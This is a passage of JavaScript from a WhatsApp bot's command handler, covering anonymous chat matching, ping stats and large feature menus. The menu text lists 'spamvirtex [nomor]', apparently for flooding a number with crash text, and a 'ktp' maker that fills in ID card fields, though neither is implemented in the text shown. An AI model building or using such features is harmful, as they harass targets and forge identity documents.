                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: '🚶Start🚶' }, type: 1 }
                    ]
                    await Pajrin.sendButtonText(m.chat, buttons, `_You Are Not In Anonymous Session, Press The Button To Find A Partner_`)
                    throw false
                }
                reply('Ok')
                let other = room.other(m.sender)
                if (other) await Pajrin.sendText(other, `_Partner Has Left Anonymous Session_`, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case '12345mulai': case '12345start': {
                if (m.isGroup) return reply('This Features Cannot Be Use in Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: '.keluar', buttonText: { displayText: '😏Stop😏' }, type: 1 }
                    ]
                    await Pajrin.sendButtonText(m.chat, buttons, `_You Are Still In Anonymous Session, Press The Button Below To Terminate Your Anonymous Session_`,  `${global.fake}`, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: '.next', buttonText: { displayText: '🍃Skip🍃' }, type: 1 },
                        { buttonId: '.keluar', buttonText: { displayText: '😏Stop😏' }, type: 1 }
                    ]
                    await Pajrin.sendButtonText(room.a, buttons, `_Successfully Found Partner, Now You Can Send Messages_`,  `${global.fake}`, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await Pajrin.sendButtonText(room.b, buttons, `_Successfully Found Partner, Now You Can Send Messages_`,  `${global.fake}`, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: '😏Stop😏' }, type: 1 }
                    ]
                    await Pajrin.sendButtonText(m.chat, buttons, `_Please Wait, Looking For A Partner_`,  `${global.fake}`, m)
                }
                break
            }
            case '12345skip':  case '12345next': case '12345lanjut': {
                if (m.isGroup) return reply('This Feature Cannot Be Used In Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: '.start', buttonText: { displayText: '🚶Start🚶' }, type: 1 }
                    ]
                    await Pajrin.sendButtonText(m.chat, buttons, `\`\`\`You Are Not In Anonymous Session, Press The Button To Find A Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await Pajrin.sendText(other, `\`\`\`Partner Has Left Anonymous Session\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: '🍃Skip🍃' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: '😏Stop😏' }, type: 1 }
                    ]
                    await Pajrin.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``,  `${global.fake}`, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await Pajrin.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``,  `${global.fake}`, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: '😏Stop😏' }, type: 1 }
                    ]
                    await Pajrin.sendButtonText(m.chat, buttons, `\`\`\`Please wait, looking for a partner\`\`\``,  `${global.fake}`, m)
                }
                break
            }
            case '12345public': {
                if (!isCreator) throw mess.owner
                Pajrin.public = true
                reply('Successfully Changed To Public Usage')
            }
            break
            case '12345self': {
                if (!isCreator) throw mess.owner
                Pajrin.public = false
                reply('Successfully Changed To Self Usage')
            }
            break
            case '12345ping': case '12345botstatus': case '12345statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

NodeJS Memory Usaage
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                reply(respon)
            }
            break
            case '12345owner': case '12345creator': {
            Pajrin.sendContact(m.chat, global.pemilik, m)
           const devsound = fs.readFileSync('./BotMedia/botdev.mp3') //u can change the music in BotMedia folder
           Pajrin.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
            }
            break
                    case '12345bug': case '12345report': {
                    	if(!text) throw `Enter The Bug Example\n\n${prefix + command} Menu Error `
                    	Pajrin.sendMessage(`${global.pemilik}@s.whatsapp.net`, {text: `*Bug Report From:* wa.me/${m.sender.split("@")[0]}
Report Message: ${text}` })
reply(`Successfully Reported To The Owner\n\nPlease Make Sure The Bug Is Valid, If You Play With This, Use This Feature Again And Again For No Reason, You Will Be Blocked For Sure !`)
                    }
                    break 
                    
case '12345tes': case '12345test': case '12345alive': case '12345bot': case '12345robot': case '12345cheems': case '12345doge':{
                          timestampe = speed();
latensie = speed() - timestampe
  	anu = ` Hi 🤚 ${pushname}
${global.botnma} in here
`
  let message = await prepareWAMessageMedia({ video: global.vidmenu3, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `Button tidak muncul?, ketik ${prefix}allmenu untuk menampilkan semua fitur BOT\n\n${global.fake}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                            	urlButton: {
                                displayText: `${global.medsos2}`,
                                    url: `${global.medsos2url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗔𝗹𝗹 𝗠𝗲𝗻𝘂',
                                    id: `${prefix}allmenu`
                                }
                                }, {
                                quickReplyButton: {
                                    displayText: '𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂',
                                    id: `${prefix}command`
                                }
                                }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
break


            case '12345list': case '12345menu': case '12345help': case '12345?': {
          timestampe = speed();
latensie = speed() - timestampe
  	anu = ` Hi 🤚 ${pushname}
How Are You? 😊


❏「 INFO BOT 」

𝗦𝗽𝗲𝗲𝗱 : ${latensie.toFixed(4)} miliseconds
𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}
𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : ${global.botnma}
𝗢𝘄𝗻𝗲𝗿 𝗡𝗮𝗺𝗲 : ${global.ownernma}
𝗢𝘄𝗻𝗲𝗿 𝗡𝘂𝗺𝗯𝗲𝗿 : ${global.owner}
𝗛𝗼𝘀𝘁 𝗡𝗮𝗺𝗲 : ${os.hostname()}
𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}

`
  let message = await prepareWAMessageMedia({ video: global.vidmenu1, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `Button tidak muncul?, ketik ${prefix}allmenu untuk menampilkan semua fitur BOT\n\n© ${global.botnma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                            	urlButton: {
                                displayText: `${global.medsos2}`,
                                    url: `${global.medsos2url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗔𝗹𝗹 𝗠𝗲𝗻𝘂',
                                    id: `${prefix}allmenu`
                                }
                                }, {
                                quickReplyButton: {
                                    displayText: '𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂',
                                    id: `${prefix}command`
                                }
                                }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
break

            
case '12345command': case '12345listmenu': case '12345menulist':{
	const tanggal = moment.tz('Asia/Jakarta').format('dddd') + ', ' + moment.tz('Asia/Jakarta').format('LL')
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                listMessage :{
                    title: `Hi ${pushname}`,
                    description: `Please Choose The Menu\n`,
                    buttonText: "Menu",
                    footerText: `_${global.botnma}_\n${tanggal}`,
                    listType: "SINGLE_SELECT",
                    sections: [{
								"title": "🤖🇧​🇴​🇹​ 🇮​🇳​🇫​🇴​🇷​🇲​🇦​🇹​🇮​🇴​🇳​🤖",
								"rows": [
								   {
										"title": "ABOUT THIS BOT",
										"rowId": `${prefix}aboutbot`
									},
									{
										"title": "SEWA BOT",
										"rowId": `${prefix}sewabot`
									},
									{
										"title": "PING",
										"rowId": `${prefix}ping`
									},
									{
										"title": "Term of Service",
										"rowId": `${prefix}tosbot`
									},
									{
										"title": "OWNER THIS BOT",
										"rowId": `${prefix}owner`
									}
								]
							},
							{
								"title": "🇬​🇷​🇴​🇺​🇵​ 🇫​🇪​🇦​🇹​🇺​🇷​🇪​🇸​",
								"rows": [
								   {
										"title": "[👮‍♂️] Admin Group Menu",
										"description": "Fitur khusus admin group",
                                         "rowId": `${prefix}admingroupmenu`
									},
									{
										"title": "[⚙️] Group System Menu",
										"description": "Sistem & Setting Group-Fitur khusus admin group",
										"rowId": `${prefix}groupset`
									},
									{
										"title": "[👨‍👩‍👧‍👦] Group Menu",
										"description": "Fitur untuk semua, di group",
										"rowId": `${prefix}groupmenu`
									}
								]
							},
							{
								"title": "🇧​🇴​🇹​ 🇫​🇪​🇦​🇹​🇺​🇷​🇪​🇸​",
								"rows": [
									{
										"title": "[📑] All Menu",
										"description": "Menampilkan semua fitur bot!",
										"rowId": `${prefix}allmenu`
									},
									{
										"title": "[ 🗿] Anime & Manga Menu",
										"description": "Menampilkan menu anime & manga",
										"rowId": `${prefix}animemenu`
									},
									{
										"title": "[♻️] Convert Menu",
										"description": "Fitur convert file dan media",
										"rowId": `${prefix}convertmenu`
									},
										{
											"title": "[🖼] Creator Maker Menu",
										"description": "Menggabungkan foto dan teks",
										"rowId": `${prefix}creatormakermenu`
										},
										{
											"title": "[📂] Database & Chat Menu [💬]",
										"description": "Menu database dan chat bot",
										"rowId": `${prefix}databasemenu`
										},
										{
											"title": "[📥] Downloader Menu",
										"description": "Menu download media online",
										"rowId": `${prefix}downloadmenu`
										},
										{
										"title": "[ℹ️] Game Checker",
										"description": "Alat pengecek PlayerID Game",
										"rowId": `${prefix}gamechecker`
										},
										{
											"title": "[🎮] Game Menu",
										"description": "Game seru dan asik di sela waktu senggang ",
										"rowId": `${prefix}gamemenu`
										},
										{
											"title": "[📚] Informasi Menu",
										"description": "Cari informasi apa saja di menu ini",
										"rowId": `${prefix}infomenu`
										},
										{
										"title": "[﷽] Islami Menu",
										"description": "Menu Islami | Al-Qur'an, Sholat, Kisah Nabi, dll",
										"rowId": `${prefix}islammenu`
										},
										{
											"title": "[🌚] Meme Menu",
										"description": "Random foto meme kocak",
										"rowId": `${prefix}mememenu`
										},
										{
											"title": "[🌝] Meme Maker Menu",
										"description": "Editor pembuat meme",
										"rowId": `${prefix}mememakermenu`
										},
										{
											"title": "[📰] News Berita Menu",
										"description": "Berita aktual dalam dan luar negeri",
										"rowId": `${prefix}beritamenu`
										},
										{
										"title": "[🎇] Photo Editor",
										"description": "Foto editor dan efek foto!",
										"rowId": `${prefix}photoeditormenu`
									},
									{
										"title": "[💝] Primbon Menu",
										"description": "Menu primbon lengkap",
										"rowId": `${prefix}primbonmenu`
									},
									{
										"title": "[📄] Quotes Menu",
										"description": "Menu quotes dan kata bijak",
										"rowId": `${prefix}quotesmenu`
									},
									{
										"title": "[📝] Quotes Maker Menu",
										"description": "Editor foto | Quotes maker",
										"rowId": `${prefix}quotesmakermenu`
									},
										{
											"title": "[🌌] Random Image",
										"description": "Random berbagai foto",
										"rowId": `${prefix}randomimage`
										},
										{
											"title": "[📋] Random Teks",
										"description": "Random berbagai teks",
										"rowId": `${prefix}randomteks`
										},
										{
											"title": "[🔎] Search Menu",
										"description": "Menu pencarian | Cari apa saja dengan menu ini",
										"rowId": `${prefix}searchmenu`
										},
										{
										"title": "[🏫] Sekolah Menu",
										"description": "Menu pendukung kebutuhan belajar",
										"rowId": `${prefix}sekolahmenu`
										},
										{
											"title": "[🏆] Sertifikat Menu ",
										"description": "Buat berbagai sertifikat mudah dengan nama mu ",
										"rowId": `${prefix}sertifikatmenu`
										},
										{
											"title": "[🔭] Stalk Menu",
										"description": "Menampilkan user profil IG, Tiktok, Github, dll",
										"rowId": `${prefix}stalkmenu`
										},
										{
										"title": "[🫥] Sticker Menu",
										"description": "Buat dan Edit Sticker WhatsApp sesukamu",
										"rowId": `${prefix}stickermenu`
										},
										{
											"title": "[🌠] Teks Maker",
										"description": "Buat teks menjadi foto, dengan pilihan gaya yang banyak",
										"rowId": `${prefix}teksmaker`
										},
										{
											"title": "[🌐] Tools & Internet Menu",
										"description": "Alat yang membantu mu, untuk memudahkan dalam dunia internet",
										"rowId": `${prefix}toolsmenu`
										},
									 {
											"title": "[🎵] Voice Changer Menu",
										"description": "Alat untuk merubah suara",
										"rowId": `${prefix}voicechanger`
										}
								]
							},
							{
								"title": "🇧​🇪​🇹​🇦​ 🇫​🇪​🇦​🇹​🇺​🇷​🇪​🇸​",
								"rows": [
									{
										"title": "[💭] Anonymous Chat Menu",
										"description": "Ngobrol dengan sesama pengguna",
										"rowId": `${prefix}anonymouschatmenu`
									},
									{
										"title": "[📧] Email Sementara",
										"description": "Dapatkan Email sementara dan kelola sesuka Kamu",
										"rowId": `${prefix}emailmenu`
									}
								]
							},
							{
								"title": "🇴​🇼​🇳​🇪​🇷​ 🇫​🇪​🇦​🇹​🇺​🇷​🇪​🇸​",
								"rows": [
									{
										"title": "[🤴] Owner Menu",
										"description": "Fitur khusus owner bot",
										"rowId": `${prefix}ownermenu`
									}
								]
							},
							{
								"title": "🤖🇧​🇴​🇹​ 🇮​🇳​🇫​🇴​🇷​🇲​🇦​🇹​🇮​🇴​🇳​🤖",
								"rows": [
								  {
										"title": "ABOUT DEVELOPERS",
									
										"rowId": `${prefix}aboutdev`
									},
									{
										"title": "DONASI",
									
										"rowId": `${prefix}donasi`
									},
									{
										"title": "BOT SCRIPT",
									
										"rowId": `${prefix}script`
									},
									{
										"title": "THANKS TO",
									
										"rowId": `${prefix}tqto`
									},
									{
										"title": "REPORT BUG",
									
										"rowId": `${prefix}report`
									}
								]
							}
						],
          listType: 1
                }
            }), {})
            Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
            case '12345allmenu': case '12345menuall': case '12345semuamenu': case '12345allfitur': case '12345fiturall': case '12345semuafitur': {
            	reply(`━━━━━ 𝗔𝗟𝗟 𝗠𝗘𝗡𝗨 ━━━━━

*✧ Owner Menu ✧*
  ➙ ${prefix}self 
  ➙ ${prefix}bc [teks]
  ➙ ${prefix}bcgc [teks]
  ➙ ${prefix}setbotpp _Reply image_
  ➙ ${prefix}join [link gc wa]
  ➙ ${prefix}out _in group chat_
  ➙ ${prefix}block [nomor]
  ➙ ${prefix}unblock [nomor]
  ➙ ${prefix}lockcmd _Reply sticker/image key cmd_
  ➙ ${prefix}okvirtex 
  ➙ ${prefix}spamvirtex [nomor] 
  ➙ =>
  ➙ >
  ➙ $
  
*✧ Admin Group Menu ✧*
  ➙ ${prefix}add [nomor]
  ➙ ${prefix}kick @user
  ➙ ${prefix}groupset
  ➙ ${prefix}tagall
  ➙ ${prefix}hidetag [teks]
  ➙ ${prefix}setname [teks]
  ➙ ${prefix}setdesk [teks]
  ➙ ${prefix}setppgc _Reply image_
  ➙ ${prefix}promote @user
  ➙ ${prefix}demote @user

*✧ Group System & Setting ✧*
  ➙ ${prefix}groupset

*✧ Group Menu ✧*
  ➙ ${prefix}hidetag [teks]
  ➙ ${prefix}grupinfo 
  ➙ ${prefix}linkgroup
  ➙ ${prefix}listonline 
  ➙ ${prefix}vote
  ➙ ${prefix}couple
  ➙ ${prefix}pasanganku
  ➙ ${prefix}add [nomor]
  ➙ ${prefix}del _Reply pesan bot_ 
  ➙ ${prefix}chatinfo _Reply pesan bot_ 
  ➙ ${prefix}quoted _Reply pesan contain reply_ 
  
*✧ Anime & Manga Menu ✧*
  ➙ ${prefix}animesearch [query]
  ➙ ${prefix}mangasearch [query]
  ➙ ${prefix}character [query]
  ➙ ${prefix}kusonimes [query]
  ➙ ${prefix}storyanime
  ➙ ${prefix}neonime

*✧ Convert Menu ✧*
  ➙ ${prefix}sticker _Reply image/video_
  ➙ ${prefix}toimg _Reply sticker_
  ➙ ${prefix}tovideo _Reply sticker_
  ➙ ${prefix}togif _Reply sticker_
  ➙ ${prefix}toaudio _Reply video_
  ➙ ${prefix}tomp3 _Reply video_
  ➙ ${prefix}tovn _Reply video/audio_
  ➙ ${prefix}tourl _Reply Foto/Video/Dokumen_
  ➙ ${prefix}imagenobg _Reply Image/foto_
  ➙ ${prefix}topdf _Reply Foto/dokumen_
  ➙ ${prefix}emojimix [emoji1+emoji2]
  ➙ ${prefix}tobinary _Reply pesan teks_
  ➙ ${prefix}dbinary _Reply pesan kode binary_
  ➙ ${prefix}tohex [teks]
  ➙ ${prefix}dhex [kode hex]
  ➙ ${prefix}tomorse [teks]
  ➙ ${prefix}dmorse [kode morse]
  ➙ ${prefix}style [teks]

*✧ Creator Maker Menu ✧*
  ➙ ${prefix}gsuggest [teks1+teks2+teks3]
  
  ➙ ${prefix}ytkomen [username+comment] _Reply image_
  
  ➙ ${prefix}phkomen [username+comment] _Reply image_
  
  ➙ ${prefix}yugioh [title+deskripsi+atk+def] _Reply image_
  
  ➙ ${prefix}ktp [Nik+Provinsi+Kabupaten+Nama+tempat tanggal lahir+Jenis kelamin+Jalan+Rt/Rw+Desa+Kecamatan+Agama+Status kawin+Pekerjaan+Warga Negara+Berlaku hingga] _Reply image_
 
  ➙ ${prefix}amongus [teks]
  ➙ ${prefix}idulfitri [teks]
  ➙ ${prefix}ramadhan [teks]
  ➙ ${prefix}twtrump [teks]
 
 
*✧ Database & Chat Menu ✧*
  ➙ ${prefix}delete _Reply message bot_
  ➙ ${prefix}del _Reply message bot_
  ➙ ${prefix}afk [alasan]
  ➙ ${prefix}setcmd [${prefix}command nya] _Reply sticker/image_
  ➙ ${prefix}listcmd
  ➙ ${prefix}delcmd _Reply sticker/image key cmd_
  ➙ ${prefix}lockcmd _Reply sticker/image key cmd_
  ➙ ${prefix}listpc
  ➙ ${prefix}listgc
  ➙ ${prefix}addmsg [teks] _Reply message_
  ➙ ${prefix}getmsg [key msg] 
  ➙ ${prefix}listmsg
  ➙ ${prefix}delmsg [key msg]
  
*✧ Downloader Menu ✧*
  ➙ ${prefix}play [query]
  ➙ ${prefix}ytmp4 [url]
  ➙ ${prefix}ytmp3 [url]
  ➙ ${prefix}tiktok [url]
  ➙ ${prefix}tiktokmp3 [url]
  ➙ ${prefix}igtv [url]
  ➙ ${prefix}igreels [url]
  ➙ ${prefix}twittervideo [url]
  ➙ ${prefix}twitterfoto [url]
  ➙ ${prefix}getvideo [nomor list yts]
  ➙ ${prefix}getmusic [nomor list yts]
  ➙ ${prefix}ringtone [query]
  ➙ ${prefix}gimage [query]
  ➙ ${prefix}pinterest [query]
  ➙ ${prefix}wikimedia [query]
  ➙ ${prefix}wallpaper [query]
  ➙ ${prefix}mediafire [url]
  ➙ ${prefix}sfilemobi [url]
  
*✧ Game Checker ✧*
  ➙ ${prefix}ffcek [PlayerID]
  ➙ ${prefix}mlbbcek [PlayerID ServerID]
  ➙ ${prefix}pubgcek [PlayerID]
  ➙ ${prefix}dominocek [UserID]
  
*✧ Game Menu ✧*
  ➙ ${prefix}math
  ➙ ${prefix}tebak lirik
  ➙ ${prefix}tebak kata
  ➙ ${prefix}tebak kalimat
  ➙ ${prefix}tebak gambar
  ➙ ${prefix}tebak lagu
  ➙ ${prefix}tebak lontong
 
*✧ Informasi Menu ✧*
  ➙ ${prefix}wikipedia [query]
  ➙ ${prefix}kbbi [query]
  ➙ ${prefix}cuaca [kota]
  ➙ ${prefix}barinly [query]
  ➙ ${prefix}chord [judul lagu]
  ➙ ${prefix}beasiswa
  ➙ ${prefix}jadwaltv
  ➙ ${prefix}jadwalbola
  ➙ ${prefix}infogempa
  ➙ ${prefix}corona
  ➙ ${prefix}coronaindo
  ➙ ${prefix}jarak [kota1 kota2]
  
*✧ Islami Menu ✧*
  ➙ ${prefix}listsurah
  ➙ ${prefix}alquran
  ➙ ${prefix}alquranmp3
  ➙ ${prefix}surahmp3
  ➙ ${prefix}ayatmp3
  ➙ ${prefix}jadwalsholat [NamaKota]
  ➙ ${prefix}hadits
  ➙ ${prefix}niatsholat
  ➙ ${prefix}quotesislami
  ➙ ${prefix}asmaulhusna
  ➙ ${prefix}kisahnabi
  
*✧ Meme Menu ✧*
  ➙ ${prefix}darkjoke
  ➙ ${prefix}memeindo
  ➙ ${prefix}memeglobal

*✧ Meme Maker Menu ✧*
  ➙ ${prefix}meme1 [teks]
  ➙ ${prefix}mem2 [teks1+teks2]
  ➙ ${prefix}meme3 [teks1+teks2+teks3]
  ➙ ${prefix}meme4 [teks]
  ➙ ${prefix}meme5 [teks]
  ➙ ${prefix}meme6 [teks1+teks2+teks3]
  ➙ ${prefix}mem7 [teks1+teks2]
  ➙ ${prefix}meme8 [teks1+teks2+teks3]
  ➙ ${prefix}kanna [teks]
  ➙ ${prefix}mind [teks]
  ➙ ${prefix}ohno [teks]
  ➙ ${prefix}smeme [teks1+teks2] _Reply Image_
  ➙ ${prefix}memecreator [teks1+teks2] _Reply Image_

*✧ News Berita Menu ✧*
  ➙ ${prefix}hoax
  ➙ ${prefix}newsinfo
  ➙ ${prefix}liputan6
  ➙ ${prefix}republika
  ➙ ${prefix}kumparan
  ➙ ${prefix}detiknews
  ➙ ${prefix}jalantikus
  ➙ ${prefix}cnnindonesia
  ➙ ${prefix}cnnnasional
  ➙ ${prefix}cnninternasional
  ➙ ${prefix}cnnolahraga
  ➙ ${prefix}cnnteknologi
  ➙ ${prefix}cnnhiburan
  ➙ ${prefix}cnnsocial
  
*✧ Photo Editor ✧*
  ➙ ${prefix}wasted _Reply Foto_ 
  ➙ ${prefix}pencil _Reply Foto_ 
  ➙ ${prefix}triggered _Reply Foto_
  ➙ ${prefix}fisheye _Reply Foto_
  ➙ ${prefix}skullmask _Reply Foto_
  ➙ ${prefix}cartoon _Reply Foto_
  ➙ ${prefix}invert _Reply Foto_
  ➙ ${prefix}pixelate _Reply Foto_
  ➙ ${prefix}flip _Reply Foto_
  ➙ ${prefix}grayscale _Reply Foto_
  ➙ ${prefix}roundimage _Reply Foto_
  
  ➙ ${prefix}affect _Reply Foto_
  ➙ ${prefix}beautiful _Reply Foto_
  ➙ ${prefix}facepalm _Reply Foto_
  ➙ ${prefix}hitler _Reply Foto_
  ➙ ${prefix}jail _Reply Foto_
  ➙ ${prefix}jokeoverhead _Reply Foto_
  ➙ ${prefix}rainbow _Reply Foto_
  ➙ ${prefix}sepia _Reply Foto_
  ➙ ${prefix}trash _Reply Foto_
  ➙ ${prefix}wanted _Reply Foto_
  
  ➙ ${prefix}1977 _Reply Foto_
  ➙ ${prefix}aden _Reply Foto_
  ➙ ${prefix}brannan _Reply Foto_
  ➙ ${prefix}brooklyn _Reply Foto_
  ➙ ${prefix}gingham _Reply Foto_
  ➙ ${prefix}hudson _Reply Foto_ 
  ➙ ${prefix}inkwell _Reply Foto_
  ➙ ${prefix}earlybird _Reply Foto_
  ➙ ${prefix}kelvin _Reply Foto_
  ➙ ${prefix}larlk _Reply Foto_
  ➙ ${prefix}lofi _Reply Foto_
  ➙ ${prefix}maven _Reply Foto_ 
  ➙ ${prefix}mayfair _Reply Foto_
  ➙ ${prefix}moon _Reply Foto_
  ➙ ${prefix}perpetua _Reply Foto_
  ➙ ${prefix}nashville _Reply Foto_
  ➙ ${prefix}reyes _Reply Foto_
  ➙ ${prefix}rise _Reply Foto_
  ➙ ${prefix}slumber _Reply Foto_
  ➙ ${prefix}stinson _Reply Foto_
  ➙ ${prefix}toaster _Reply Foto_
  ➙ ${prefix}valencia _Reply Foto_
  ➙ ${prefix}walden _Reply Foto_
  ➙ ${prefix}willow _Reply Foto_
  ➙ ${prefix}gingham _Reply Foto_
  ➙ ${prefix}xpro2 _Reply Foto_
  
  
*✧ Primbon Menu ✧*
  ➙ ${prefix}nomerhoki [nomor]
  ➙ ${prefix}artimimpi [mimpi apa]
  ➙ ${prefix}ramalanjodoh
  ➙ ${prefix}ramalanjodohbali
  ➙ ${prefix}suamiistri
  ➙ ${prefix}ramalancinta
  ➙ ${prefix}artinama [nama]
  ➙ ${prefix}kecocokannama
  ➙ ${prefix}kecocokanpasangan
  ➙ ${prefix}jadianpernikahan
  ➙ ${prefix}sifatusaha
  ➙ ${prefix}rezeki
  ➙ ${prefix}pekerjaan
  ➙ ${prefix}ramalannasib
  ➙ ${prefix}potensipenyakit
  ➙ ${prefix}artitarot
  ➙ ${prefix}fengshui
  ➙ ${prefix}haribaik
  ➙ ${prefix}harisangar
  ➙ ${prefix}harisial
  ➙ ${prefix}nagahari
  ➙ ${prefix}arahrejeki
  ➙ ${prefix}peruntungan
  ➙ ${prefix}weton
  ➙ ${prefix}karakter
  ➙ ${prefix}keberuntungan
  ➙ ${prefix}memancing
  ➙ ${prefix}masasubur
  ➙ ${prefix}zodiak
  
*✧ Quotes Menu ✧*
  ➙ ${prefix}quotes
  ➙ ${prefix}quotesislami
  ➙ ${prefix}quotesanime
  ➙ ${prefix}quotesdilan
  ➙ ${prefix}katabijak [query]
  ➙ ${prefix}katabucin
 
*✧ Quotes Maker Menu ✧*
  ➙ ${prefix}qmaker [quotes]
  ➙ ${prefix}qmaker2 [author+quotes]
  ➙ ${prefix}qmaker3 [quotes] _Reply image_

*✧ Random Image ✧*
  ➙ ${prefix}rblackpink
  ➙ ${prefix}bts
  ➙ ${prefix}exo
  ➙ ${prefix}cecan
  ➙ ${prefix}cogan
  ➙ ${prefix}estetic
  ➙ ${prefix}elf
  ➙ ${prefix}loli
  ➙ ${prefix}neko
  ➙ ${prefix}waifu
  ➙ ${prefix}shota
  ➙ ${prefix}husbu
  ➙ ${prefix}sagiri
  ➙ ${prefix}elaina
  ➙ ${prefix}shinobu
  ➙ ${prefix}kanna
  ➙ ${prefix}megumin
  ➙ ${prefix}art
  ➙ ${prefix}wallnime
  ➙ ${prefix}neko2
  ➙ ${prefix},gif
  ➙ ${prefix}feed
  ➙ ${prefix}kiss
  ➙ ${prefix}smug
  ➙ ${prefix}tickle
  ➙ ${prefix}cuddle
  ➙ ${prefix}fox_girl
  ➙ ${prefix}bully
  ➙ ${prefix}cry
  ➙ ${prefix}hug
  ➙ ${prefix}awoo
  ➙ ${prefix}lick
  ➙ ${prefix}pat
  ➙ ${prefix}bonk
  ➙ ${prefix}yeet
  ➙ ${prefix}blush
  ➙ ${prefix}smile
  ➙ ${prefix}wave
  ➙ ${prefix}highfive
  ➙ ${prefix}handhold
  ➙ ${prefix}nom
  ➙ ${prefix}bite
  ➙ ${prefix}glomp
  ➙ ${prefix}kill
  ➙ ${prefix}slap
  ➙ ${prefix}happy
  ➙ ${prefix}wink
  ➙ ${prefix}dance
  ➙ ${prefix}cringe
  ➙ ${prefix}gasm
  
*✧ Random Teks ✧*
  ➙ ${prefix}faktaunik
  ➙ ${prefix}quotes
  ➙ ${prefix}quotesanime
